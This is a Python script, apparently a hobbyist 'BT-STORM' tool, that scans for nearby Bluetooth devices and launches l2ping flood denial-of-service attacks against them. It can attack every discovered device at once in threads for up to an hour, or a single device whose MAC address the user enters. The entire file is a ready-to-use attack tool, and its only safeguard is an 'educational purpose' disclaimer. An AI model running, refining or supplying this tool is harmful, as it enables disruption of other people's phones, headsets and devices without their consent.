import subprocess
import threading
import time
import os
import re

# Colour codes (terminal must support ANSI)
CYAN = "\033[96m"
BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

# Banner
BANNER = r"""
/$$$$$$$  /$$$$$$$$       /$$$$$$  /$$$$$$$$ /$$$$$$  /$$$$$$$  /$$      /$$
| $$__  $$|__  $$__/      /$$__  $$|__  $$__//$$__  $$| $$__  $$| $$$    /$$$
| $$  \ $$   | $$        | $$  \__/   | $$  | $$  \ $$| $$  \ $$| $$$$  /$$$$
| $$$$$$$    | $$ /$$$$$$|  $$$$$$    | $$  | $$  | $$| $$$$$$$/| $$ $$/$$ $$
| $$__  $$   | $$|______/ \____  $$   | $$  | $$  | $$| $$__  $$| $$  $$$| $$
| $$  \ $$   | $$         /$$  \ $$   | $$  | $$  | $$| $$  \ $$| $$\  $ | $$
| $$$$$$$/   | $$        |  $$$$$$/   | $$  |  $$$$$$/| $$  | $$| $$ \/  | $$
|_______/    |__/         \______/    |__/   \______/ |__/  |__/|__/     |__/
"""

# Centered 3-line credits
CREDITS = [
    "Created by Thakur2309 | YouTube: Firewall Breaker",
    "Official channel for tutorials & demos",
    "For Educational Purpose Only"
]

ATTACK_THREADS = []

def validate_mac(mac):
    """Validate Bluetooth MAC address format (XX:XX:XX:XX:XX:XX)."""
    pattern = r'^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$'
    return bool(re.match(pattern, mac))

def ensure_hci0_up():
    """Ensure hci0 is up and running."""
    try:
        result = subprocess.check_output("hciconfig", shell=True, timeout=2).decode()
        if "hci0" in result and "DOWN" in result:
            print(f"{BLUE}[*] Bringing hci0 up...{RESET}")
            subprocess.run("sudo hciconfig hci0 up", shell=True, timeout=2)
            time.sleep(1)  # Wait for adapter to stabilize
            result = subprocess.check_output("hciconfig", shell=True, timeout=2).decode()
            if "DOWN" in result:
                print(f"{RED}[!] Failed to bring hci0 up. Check Bluetooth adapter.{RESET}")
                return False
        elif "hci0" not in result:
            print(f"{RED}[!] No hci0 device found. Check Bluetooth adapter.{RESET}")
            return False
        return True
    except Exception as e:
        print(f"{RED}[!] Error ensuring hci0 up: {e}{RESET}")
        return False

def scan_devices():
    """Scan for nearby Bluetooth devices using hcitool."""
    if not ensure_hci0_up():
        return []
    print(f"{BLUE}[*] Scanning for Bluetooth devices...{RESET}")
    try:
        result = subprocess.check_output("hcitool scan", shell=True, timeout=30).decode()
        devices = []
        for line in result.splitlines()[1:]:
            parts = line.strip().split("\t")
            if len(parts) == 2:
                addr, name = parts
                if validate_mac(addr.strip()):
                    devices.append((addr.strip(), name.strip()))
        return devices
    except subprocess.TimeoutExpired:
        print(f"{RED}[!] Scan timed out after 30 seconds.{RESET}")
        return []
    except Exception as e:
        print(f"{RED}[!] Scan failed: {e}{RESET}")
        return []

def attack_device(mac, name):
    """Perform l2ping flood attack on a Bluetooth device."""
    if not ensure_hci0_up():
        return
    print(f"{GREEN}[+] Attacking {name} ({mac}) with l2ping flood...{RESET}")
    try:
        subprocess.run(f"l2ping -i hci0 -s 600 -f {mac}", shell=True, timeout=60, check=True)
    except subprocess.TimeoutExpired:
        print(f"{RED}[!] Attack on {mac} timed out after 60 seconds.{RESET}")
    except KeyboardInterrupt:
        print(f"{RED}[-] Attack on {mac} stopped by user.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error attacking {mac}: {e}{RESET}")

def start_attack(devices):
    """Start attack threads for all discovered devices."""
    for addr, name in devices:
        t = threading.Thread(target=attack_device, args=(addr, name))
        t.daemon = True
        t.start()
        ATTACK_THREADS.append(t)
        time.sleep(0.5)  # Prevent system overload

def attack_single_device():
    """Attack a single device specified by user."""
    target_mac = input(f"{YELLOW}[*] Enter the MAC address to attack (XX:XX:XX:XX:XX:XX): {RESET}").strip()
    target_name = input(f"{YELLOW}[*] Enter the name of the target device: {RESET}").strip()
   
    if validate_mac(target_mac) and target_name:
        print(f"\n{GREEN}[*] Starting DoS attack on {target_name} ({target_mac})...{RESET}\n")
        attack_device(target_mac, target_name)
    else:
        print(f"{RED}[!] Invalid MAC address or name. Exiting...{RESET}")

def main():
    """Main function to run the Bluetooth Auto Jammer."""
    os.system("clear")  # clear terminal
    print(f"{CYAN}{BANNER}{RESET}\n")
    
    # Terminal width for centering (adjust if needed)
    TERMINAL_WIDTH = 80
    for line in CREDITS:
        print(line.center(TERMINAL_WIDTH))
    
    devices = scan_devices()
    if not devices:
        print(f"{RED}[!] No Bluetooth devices found.{RESET}")
        return
    print(f"\n{YELLOW}Devices found:{RESET}")
    for i, (addr, name) in enumerate(devices):
        print(f"{YELLOW}{i+1}. {name} - {addr}{RESET}")
    confirm = input(f"\n{YELLOW}Start DoS attack on ALL devices? (y/n): {RESET}").strip().lower()
    if confirm == 'y':
        try:
            start_attack(devices)
            print(f"\n{GREEN}[*] Attacking all devices. Press CTRL+C to stop.{RESET}\n")
            time.sleep(3600)  # Run for max 1 hour
        except KeyboardInterrupt:
            print(f"\n{RED}[!] Stopped by user.{RESET}")
    elif confirm == 'n':
        print(f"{BLUE}[*] Switching to single device attack.{RESET}")
        attack_single_device()
    else:
        print(f"{RED}[!] Invalid input. Exiting...{RESET}")

if __name__ == "__main__":
    main()
